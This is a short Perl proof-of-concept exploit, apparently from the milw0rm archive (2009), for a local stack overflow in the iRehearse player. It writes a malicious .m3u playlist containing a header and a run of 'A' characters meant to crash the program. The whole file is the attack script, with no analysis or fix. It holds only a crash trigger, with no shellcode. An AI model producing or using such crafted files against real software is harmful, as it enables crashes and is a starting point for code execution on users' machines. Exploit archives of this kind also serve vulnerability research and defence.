#!/usr/bin/perl
#iRehearse (m3u) local stack overlow POC
#finded by opt!x hacker  <optix@9.cn>
#download : http://rjvmedia.co.uk/software/iRehearseTrial.zip
my $header="MILW0RM";
my $crash="A" x 40;
my $poc=$header.$crash;
open(myfile,'>>aidi.m3u');
print myfile $poc;
 
# milw0rm.com [2009-08-07]
